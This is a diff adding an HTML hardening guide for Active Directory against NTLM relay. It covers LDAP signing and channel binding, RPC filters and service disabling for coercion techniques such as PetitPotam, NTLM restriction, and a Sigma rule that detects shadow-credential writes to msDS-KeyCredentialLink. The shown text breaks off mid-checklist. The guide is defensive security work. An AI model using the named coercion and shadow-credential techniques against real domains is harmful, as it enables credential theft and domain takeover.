@@ -1,0 +1,1204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AD Relay Attack Hardening Guide</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0e14;
+            --bg-secondary: #0d1117;
+            --bg-tertiary: #161b22;
+            --bg-card: #1a1f2a;
+            --border-color: #2d3748;
+            --text-primary: #e6edf3;
+            --text-secondary: #8b949e;
+            --text-muted: #6e7681;
+            --accent-cyan: #00d4ff;
+            --accent-teal: #2dd4bf;
+            --accent-blue: #58a6ff;
+            --accent-purple: #a78bfa;
+            --accent-orange: #f97316;
+            --accent-red: #f87171;
+            --accent-green: #4ade80;
+            --code-bg: #0d1117;
+            --gradient-1: linear-gradient(135deg, #00d4ff 0%, #2dd4bf 100%);
+            --gradient-2: linear-gradient(135deg, #a78bfa 0%, #58a6ff 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Source Sans 3', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+            font-size: 16px;
+        }
+
+        /* Animated background grid */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 212, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 212, 255, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* Header */
+        header {
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border-color);
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            background: rgba(13, 17, 23, 0.9);
+        }
+
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: var(--accent-cyan);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo::before {
+            content: '>';
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        nav ul {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        nav a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        nav a:hover {
+            color: var(--accent-cyan);
+        }
+
+        /* Hero */
+        .hero {
+            padding: 6rem 2rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .hero h1 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            background: var(--gradient-1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+        }
+
+        .hero-badges {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 9999px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .badge-icon {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .badge-icon.critical { background: var(--accent-red); }
+        .badge-icon.warning { background: var(--accent-orange); }
+        .badge-icon.info { background: var(--accent-cyan); }
+
+        /* Main content */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Section cards */
+        .section {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 2.5rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: var(--gradient-1);
+        }
+
+        .section.purple::before {
+            background: var(--gradient-2);
+        }
+
+        .section.orange::before {
+            background: linear-gradient(135deg, var(--accent-orange) 0%, var(--accent-red) 100%);
+        }
+
+        .section.green::before {
+            background: linear-gradient(135deg, var(--accent-green) 0%, var(--accent-teal) 100%);
+        }
+
+        .section-number {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--accent-cyan);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.75rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            color: var(--text-primary);
+        }
+
+        h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 2rem 0 1rem;
+            color: var(--accent-teal);
+        }
+
+        h4 {
+            font-size: 1rem;
+            font-weight: 600;
+            margin: 1.5rem 0 0.75rem;
+            color: var(--text-primary);
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        /* Code blocks */
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.25rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            position: relative;
+        }
+
+        pre::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 0.5rem;
+            right: 0.75rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-cyan);
+        }
+
+        pre code {
+            color: var(--text-primary);
+        }
+
+        /* Inline code */
+        p code, li code, td code {
+            background: var(--bg-tertiary);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.85em;
+        }
+
+        /* Tables */
+        .table-wrapper {
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+        }
+
+        th {
+            background: var(--bg-tertiary);
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 600;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-secondary);
+            text-align: left;
+            padding: 1rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        td {
+            padding: 0.875rem 1rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background: rgba(0, 212, 255, 0.03);
+        }
+
+        /* Alert boxes */
+        .alert {
+            padding: 1.25rem 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            display: flex;
+            gap: 1rem;
+            align-items: flex-start;
+        }
+
+        .alert-icon {
+            font-size: 1.25rem;
+            flex-shrink: 0;
+            margin-top: 0.1rem;
+        }
+
+        .alert-warning {
+            background: rgba(249, 115, 22, 0.1);
+            border: 1px solid rgba(249, 115, 22, 0.3);
+        }
+
+        .alert-warning .alert-icon { color: var(--accent-orange); }
+
+        .alert-danger {
+            background: rgba(248, 113, 113, 0.1);
+            border: 1px solid rgba(248, 113, 113, 0.3);
+        }
+
+        .alert-danger .alert-icon { color: var(--accent-red); }
+
+        .alert-info {
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+
+        .alert-info .alert-icon { color: var(--accent-cyan); }
+
+        .alert-success {
+            background: rgba(74, 222, 128, 0.1);
+            border: 1px solid rgba(74, 222, 128, 0.3);
+        }
+
+        .alert-success .alert-icon { color: var(--accent-green); }
+
+        .alert-content strong {
+            display: block;
+            color: var(--text-primary);
+            margin-bottom: 0.25rem;
+        }
+
+        .alert-content p {
+            margin: 0;
+            font-size: 0.9rem;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1rem 0 1rem 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        li::marker {
+            color: var(--accent-cyan);
+        }
+
+        /* Checklist section */
+        .checklist {
+            display: grid;
+            gap: 0.75rem;
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem 1.25rem;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .checklist-item:hover {
+            border-color: var(--accent-cyan);
+            transform: translateX(4px);
+        }
+
+        .checklist-item input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            accent-color: var(--accent-cyan);
+            cursor: pointer;
+        }
+
+        .checklist-item label {
+            cursor: pointer;
+            flex: 1;
+            color: var(--text-secondary);
+        }
+
+        .checklist-item input:checked + label {
+            text-decoration: line-through;
+            color: var(--text-muted);
+        }
+
+        /* Steps indicator */
+        .steps {
+            display: flex;
+            gap: 1rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+
+        .step {
+            flex: 1;
+            min-width: 150px;
+            padding: 1.25rem;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            background: var(--gradient-1);
+            border-radius: 50%;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: var(--bg-primary);
+            margin-bottom: 0.75rem;
+        }
+
+        .step-title {
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: var(--text-primary);
+        }
+
+        /* Table of contents */
+        .toc {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.5rem 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .toc h3 {
+            margin-top: 0;
+            color: var(--text-primary);
+        }
+
+        .toc ol {
+            margin: 0;
+            padding-left: 1.25rem;
+        }
+
+        .toc li {
+            margin-bottom: 0.75rem;
+        }
+
+        .toc a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .toc a:hover {
+            color: var(--accent-cyan);
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 3rem 2rem;
+            border-top: 1px solid var(--border-color);
+            margin-top: 4rem;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        footer a {
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            nav ul {
+                gap: 1rem;
+            }
+
+            .hero {
+                padding: 4rem 1.5rem;
+            }
+
+            .section {
+                padding: 1.5rem;
+            }
+
+            .steps {
+                flex-direction: column;
+            }
+
+            pre {
+                font-size: 0.8rem;
+            }
+        }
+
+        /* Syntax highlighting hints */
+        .keyword { color: var(--accent-purple); }
+        .string { color: var(--accent-green); }
+        .comment { color: var(--text-muted); font-style: italic; }
+        .variable { color: var(--accent-orange); }
+        .function { color: var(--accent-blue); }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="logo">AD_HARDENING</div>
+            <nav>
+                <ul>
+                    <li><a href="#ldap">LDAP Signing</a></li>
+                    <li><a href="#coercion">Coercion</a></li>
+                    <li><a href="#ntlm">NTLM</a></li>
+                    <li><a href="#checklist">Checklist</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <h1>Active Directory Relay Attack Hardening</h1>
+        <p>A comprehensive guide to mitigating NTLM relay attacks, including shadow credentials abuse, through LDAP hardening, coercion prevention, and NTLM restrictions.</p>
+        <div class="hero-badges">
+            <span class="badge"><span class="badge-icon critical"></span>Critical Security</span>
+            <span class="badge"><span class="badge-icon warning"></span>Requires Planning</span>
+            <span class="badge"><span class="badge-icon info"></span>Windows Server 2016+</span>
+        </div>
+    </section>
+
+    <main class="container">
+        <div class="toc">
+            <h3>Contents</h3>
+            <ol>
+                <li><a href="#ldap">Enforce LDAP Signing and Channel Binding</a></li>
+                <li><a href="#coercion">Patch and Mitigate Coercion Vulnerabilities</a></li>
+                <li><a href="#ntlm">Disable NTLM Where Possible</a></li>
+                <li><a href="#additional">Additional Hardening Recommendations</a></li>
+                <li><a href="#checklist">Implementation Checklist</a></li>
+                <li><a href="#testing">Testing Your Hardening</a></li>
+            </ol>
+        </div>
+
+        <!-- Section 1: LDAP Signing -->
+        <section id="ldap" class="section">
+            <div class="section-number">Section 01</div>
+            <h2>Enforce LDAP Signing and Channel Binding</h2>
+            
+            <p>LDAP signing prevents tampering with LDAP traffic. Channel binding (Extended Protection for Authentication) ties the NTLM authentication to the TLS channel, preventing relay to LDAPS.</p>
+
+            <h3>1.1 Audit Current State</h3>
+            <p>Before enforcing, audit your environment to identify clients that don't support signing.</p>
+            
+            <h4>Enable LDAP diagnostic logging on Domain Controllers:</h4>
+            <pre data-lang="PowerShell"><code># Set LDAP Interface Events to verbose (level 2)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" /v "16 LDAP Interface Events" /t REG_DWORD /d 2 /f</code></pre>
+
+            <h4>Event IDs to monitor:</h4>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Event ID</th>
+                            <th>Meaning</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>2886</code></td>
+                            <td>Warning that signing is not required (logged on DC startup)</td>
+                        </tr>
+                        <tr>
+                            <td><code>2887</code></td>
+                            <td>Summary of unsigned binds in the last 24 hours</td>
+                        </tr>
+                        <tr>
+                            <td><code>2888</code></td>
+                            <td>Details of clients performing unsigned binds</td>
+                        </tr>
+                        <tr>
+                            <td><code>2889</code></td>
+                            <td>Individual unsigned/unbound LDAP bind attempts</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="alert alert-info">
+                <span class="alert-icon">💡</span>
+                <div class="alert-content">
+                    <strong>Pro Tip</strong>
+                    <p>Review Event ID <code>2889</code> in the Directory Service log to identify offending clients before enforcement. Run this audit for 1-2 weeks to catch all clients.</p>
+                </div>
+            </div>
+
+            <h3>1.2 Enforce LDAP Signing via Group Policy</h3>
+            <p><strong>Path:</strong> <code>Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options</code></p>
+
+            <h4>On Domain Controllers:</h4>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Policy</th>
+                            <th>Setting</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Domain controller: LDAP server signing requirements</td>
+                            <td><strong>Require signing</strong></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h4>On all domain-joined machines (clients):</h4>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Policy</th>
+                            <th>Setting</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Network security: LDAP client signing requirements</td>
+                            <td><strong>Require signing</strong></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h3>1.3 Enforce via Registry (Alternative)</h3>
+            <h4>On Domain Controllers:</h4>
+            <pre data-lang="PowerShell"><code># Require LDAP signing (2 = Require)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "LDAPServerIntegrity" /t REG_DWORD /d 2 /f</code></pre>
+
+            <h4>On Clients:</h4>
+            <pre data-lang="PowerShell"><code># Require LDAP signing (2 = Require)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LDAP" /v "LDAPClientIntegrity" /t REG_DWORD /d 2 /f</code></pre>
+
+            <h3>1.4 Enforce LDAP Channel Binding</h3>
+            <p>Channel binding is configured via registry on Domain Controllers:</p>
+            <pre data-lang="PowerShell"><code># Enable LDAP Channel Binding
+# 0 = Never, 1 = When supported, 2 = Always
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "LdapEnforceChannelBinding" /t REG_DWORD /d 2 /f</code></pre>
+
+            <div class="alert alert-warning">
+                <span class="alert-icon">⚠️</span>
+                <div class="alert-content">
+                    <strong>Important</strong>
+                    <p>Restart the DC or restart the NTDS service for changes to take effect. Plan for a maintenance window.</p>
+                </div>
+            </div>
+
+            <h3>1.5 Verify Enforcement</h3>
+            <pre data-lang="PowerShell"><code># Check DC settings
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" | 
+    Select-Object LDAPServerIntegrity, LdapEnforceChannelBinding</code></pre>
+
+            <h4>Test with ldapsearch (from Linux):</h4>
+            <pre data-lang="Bash"><code># This should fail after enforcement
+ldapsearch -x -H ldap://dc01.domain.local -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"</code></pre>
+        </section>
+
+        <!-- Section 2: Coercion -->
+        <section id="coercion" class="section orange">
+            <div class="section-number">Section 02</div>
+            <h2>Patch and Mitigate Coercion Vulnerabilities</h2>
+            
+            <p>Coercion attacks force machines to authenticate to attacker-controlled hosts. Here's how to mitigate each major technique.</p>
+
+            <h3>2.1 PetitPotam (MS-EFSRPC)</h3>
+            <h4>Patches:</h4>
+            <ul>
+                <li>KB5005413 (August 2021) - Partial fix</li>
+                <li>KB5015811 / KB5015808 (July 2022) - Additional hardening</li>
+            </ul>
+
+            <h4>RPC Filter (Recommended):</h4>
+            <p>Create an RPC filter to block EFS RPC:</p>
+            <pre data-lang="PowerShell"><code># Block EFS RPC UUID: c681d488-d850-11d0-8c52-00c04fd90f7e
+netsh rpc filter add rule layer=um actiontype=block
+netsh rpc filter add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
+
+# Also block secondary interface: df1941c5-fe89-4e79-bf10-463657acf44d
+netsh rpc filter add rule layer=um actiontype=block
+netsh rpc filter add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d</code></pre>
+
+            <h3>2.2 Print Spooler / PrinterBug (MS-RPRN)</h3>
+            
+            <div class="alert alert-danger">
+                <span class="alert-icon">🛑</span>
+                <div class="alert-content">
+                    <strong>Critical</strong>
+                    <p>Disable Print Spooler on ALL Domain Controllers unless absolutely required.</p>
+                </div>
+            </div>
+
+            <pre data-lang="PowerShell"><code># Disable and stop Print Spooler service
+Stop-Service -Name Spooler -Force
+Set-Service -Name Spooler -StartupType Disabled</code></pre>
+
+            <h4>Via GPO:</h4>
+            <pre><code>Computer Configuration → Policies → Windows Settings → Security Settings → System Services
+→ Print Spooler = Disabled</code></pre>
+
+            <h3>2.3 DFSCoerce (MS-DFSNM)</h3>
+            <p>No direct patch available. Rely on LDAP signing and NTLM restrictions as primary mitigations.</p>
+            <pre data-lang="PowerShell"><code># If DFS is not needed, disable the service
+Set-Service -Name "DFS" -StartupType Disabled
+Stop-Service -Name "DFS"</code></pre>
+
+            <h3>2.4 ShadowCoerce (MS-FSRVP)</h3>
+            <p>Disable the File Server VSS Agent Service if not needed:</p>
+            <pre data-lang="PowerShell"><code># Disable FSRVP
+Set-Service -Name "FSRVP" -StartupType Disabled -ErrorAction SilentlyContinue
+Stop-Service -Name "FSRVP" -ErrorAction SilentlyContinue</code></pre>
+
+            <h3>2.5 View Active RPC Filters</h3>
+            <pre data-lang="PowerShell"><code># View active filters
+netsh rpc filter show filter</code></pre>
+
+            <h3>2.6 Keep Systems Patched</h3>
+            <pre data-lang="PowerShell"><code># Check installed hotfixes
+Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20</code></pre>
+        </section>
+
+        <!-- Section 3: NTLM -->
+        <section id="ntlm" class="section purple">
+            <div class="section-number">Section 03</div>
+            <h2>Disable NTLM Where Possible</h2>
+            
+            <p>Disabling NTLM eliminates relay attacks entirely but requires careful planning. Use this phased approach.</p>
+
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-title">Audit Usage</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-title">Add Exceptions</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-title">Restrict NTLM</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div class="step-title">Protect Accounts</div>
+                </div>
+            </div>
+
+            <h3>3.1 Phase 1: Audit NTLM Usage</h3>
+            <h4>Enable NTLM auditing via GPO:</h4>
+            <p><strong>Path:</strong> <code>Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options</code></p>
+            
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Policy</th>
+                            <th>Setting</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Network security: Restrict NTLM: Audit Incoming NTLM Traffic</td>
+                            <td>Enable auditing for all accounts</td>
+                        </tr>
+                        <tr>
+                            <td>Network security: Restrict NTLM: Audit NTLM authentication in this domain</td>
+                            <td>Enable all</td>
+                        </tr>
+                        <tr>
+                            <td>Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers</td>
+                            <td>Audit all</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h4>Event IDs to monitor:</h4>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Event ID</th>
+                            <th>Log</th>
+                            <th>Meaning</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>4624</code></td>
+                            <td>Security</td>
+                            <td>Logon events (check AuthenticationPackageName for NTLM)</td>
+                        </tr>
+                        <tr>
+                            <td><code>8001</code></td>
+                            <td>NTLM/Operational</td>
+                            <td>NTLM client blocked</td>
+                        </tr>
+                        <tr>
+                            <td><code>8002</code></td>
+                            <td>NTLM/Operational</td>
+                            <td>NTLM server blocked audit</td>
+                        </tr>
+                        <tr>
+                            <td><code>8003</code></td>
+                            <td>NTLM/Operational</td>
+                            <td>NTLM server blocked</td>
+                        </tr>
+                        <tr>
+                            <td><code>8004</code></td>
+                            <td>NTLM/Operational</td>
+                            <td>Domain controller blocked audit</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h4>Enable the NTLM operational log:</h4>
+            <pre data-lang="PowerShell"><code>wevtutil set-log "Microsoft-Windows-NTLM/Operational" /enabled:true</code></pre>
+
+            <h4>Query for NTLM authentication events:</h4>
+            <pre data-lang="PowerShell"><code># Find NTLM logons
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
+    Where-Object { $_.Properties[10].Value -eq 'NTLM' } |
+    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, 
+                  @{N='Source';E={$_.Properties[11].Value}}</code></pre>
+
+            <h3>3.2 Phase 2: Add Exceptions for Known Requirements</h3>
+            <p>Some applications legitimately require NTLM. Create exception lists.</p>
+            
+            <h4>Via GPO:</h4>
+            <pre><code>Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
+→ Network security: Restrict NTLM: Add server exceptions for NTLM authentication in this domain</code></pre>
+
+            <p>Add servers that require NTLM:</p>
+            <pre><code>legacyserver.domain.local
+oldapp.domain.local</code></pre>
+
+            <h3>3.3 Phase 3: Restrict NTLM</h3>
+            <h4>Deny NTLM for domain accounts:</h4>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Policy</th>
+                            <th>Setting</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Network security: Restrict NTLM: NTLM authentication in this domain</td>
+                            <td>Deny for domain accounts to domain servers</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h4>For stricter enforcement:</h4>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Policy</th>
+                            <th>Setting</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Network security: Restrict NTLM: Incoming NTLM traffic</td>
+                            <td>Deny all accounts</td>
+                        </tr>
+                        <tr>
+                            <td>Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers</td>
+                            <td>Deny all</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <h3>3.4 Protect Sensitive Accounts First</h3>
+            <p>Add high-value accounts to the <strong>Protected Users</strong> security group:</p>
+            <pre data-lang="PowerShell"><code># Add sensitive accounts to Protected Users
+Add-ADGroupMember -Identity "Protected Users" -Members "admin-account", "service-admin"</code></pre>
+
+            <div class="alert alert-info">
+                <span class="alert-icon">🔒</span>
+                <div class="alert-content">
+                    <strong>Protected Users Restrictions</strong>
+                    <p>Cannot use NTLM authentication • Cannot use DES or RC4 in Kerberos pre-authentication • Cannot be delegated • Kerberos TGT lifetime reduced to 4 hours</p>
+                </div>
+            </div>
+
+            <div class="alert alert-warning">
+                <span class="alert-icon">⚠️</span>
+                <div class="alert-content">
+                    <strong>Caution</strong>
+                    <p>Test thoroughly in a lab environment. Some legacy systems may break when accounts are added to Protected Users.</p>
+                </div>
+            </div>
+
+            <h3>3.5 Block NTLM for Specific Sensitive Servers</h3>
+            <p>On critical servers (Domain Controllers, CA servers, etc.):</p>
+            <pre data-lang="PowerShell"><code># Registry: Deny all incoming NTLM
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v "RestrictReceivingNTLMTraffic" /t REG_DWORD /d 2 /f
+
+# Registry: Deny all outgoing NTLM  
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v "RestrictSendingNTLMTraffic" /t REG_DWORD /d 2 /f</code></pre>
+        </section>
+
+        <!-- Section 4: Additional -->
+        <section id="additional" class="section green">
+            <div class="section-number">Section 04</div>
+            <h2>Additional Hardening Recommendations</h2>
+
+            <h3>4.1 Monitor msDS-KeyCredentialLink Changes</h3>
+            <p>Create an Advanced Audit Policy and alerts for shadow credentials:</p>
+            <pre data-lang="PowerShell"><code># Enable Directory Service Changes auditing
+auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable</code></pre>
+
+            <p>Monitor for <strong>Event ID 5136</strong> with attribute <code>msDS-KeyCredentialLink</code>.</p>
+
+            <h4>SIEM/Sigma Rule Example:</h4>
+            <pre data-lang="YAML"><code>title: Shadow Credentials Added
+status: experimental
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 5136
+        AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
+    condition: selection
+level: high</code></pre>
+
+            <h3>4.2 Reduce MachineAccountQuota</h3>
+            <p>Prevent users from joining arbitrary computers to the domain:</p>
+            <pre data-lang="PowerShell"><code># Set to 0 (recommended)
+Set-ADDomain -Identity "domain.local" -Replace @{"ms-DS-MachineAccountQuota"="0"}</code></pre>
+
+            <h3>4.3 Enable Extended Protection for Authentication (EPA)</h3>
+            <p>For IIS, Exchange, ADFS, and other web services:</p>
+            <pre data-lang="PowerShell"><code># IIS - Enable EPA
+Set-WebConfigurationProperty -Filter '/system.webServer/security/authentication/windowsAuthentication' `
+    -Name 'extendedProtection.tokenChecking' -Value 'Require' -PSPath 'IIS:\'</code></pre>
+
+            <h3>4.4 Implement Tiered Administration</h3>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Tier</th>
+                            <th>Scope</th>
+                            <th>Examples</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Tier 0</strong></td>
+                            <td>AD Infrastructure</td>
+                            <td>Domain Controllers, AD management</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Tier 1</strong></td>
+                            <td>Servers & Applications</td>
+                            <td>Member servers, databases, app servers</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Tier 2</strong></td>
+                            <td>End-user Devices</td>
+                            <td>Workstations, laptops, user devices</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="alert alert-danger">
+                <span class="alert-icon">🛑</span>
+                <div class="alert-content">
+                    <strong>Golden Rule</strong>
+                    <p>Never use Tier 0 credentials on lower tiers. Credential theft on a workstation should never lead to domain compromise.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 5: Checklist -->
+        <section id="checklist" class="section">
+            <div class="section-number">Section 05</div>
+            <h2>Implementation Checklist</h2>
+
+            <div class="checklist">
+                <div class="checklist-item">
+                    <input type="checkbox" id="check1">
+                    <label for="check1">Enable LDAP diagnostic logging</label>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="check2">
+                    <label for="check2">Audit LDAP clients for 1-2 weeks</label>
+                </div>
+                <div class="checklist-item">
